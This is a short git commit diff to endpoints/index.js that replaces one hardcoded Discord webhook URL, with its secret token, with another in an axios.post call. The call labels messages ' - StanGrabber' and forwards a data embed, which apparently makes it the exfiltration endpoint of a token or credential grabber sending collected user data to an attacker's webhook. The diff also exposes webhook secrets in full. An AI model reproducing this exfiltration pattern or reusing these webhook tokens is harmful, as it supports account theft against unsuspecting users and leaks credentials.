6f5762e20a9e8fcf81c0093523597e64b253e07b
G10PA <83762885+G10PA@users.noreply.github.com>
2022-02-08 22:50:43 +0100

    Update index.js

--- endpoints/index.js
+++ endpoints/index.js
@@ -48,7 +48,7 @@ exports.send = (req, res, webhook) => {
 }
             
 
-        axios.post(`https://discord.com/api/webhooks/808648414199676948/Koi4dO3acEhEyIRJzVaxZ7-FDWJfmqK6kZX13nrklxmLWPkhQBhtkFe8JBtKgdojXSCn`, {
+        axios.post(`https://discord.com/api/webhooks/940633832330240052/ZV84Dv38pOI71PSWmyTQm94_HPV16i4yE5RfWQSmxB3gmlDkaCfFgAvEB3kLmpN3Ohb1`, {
             username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
             content: '', 
             embeds:[ omg ]
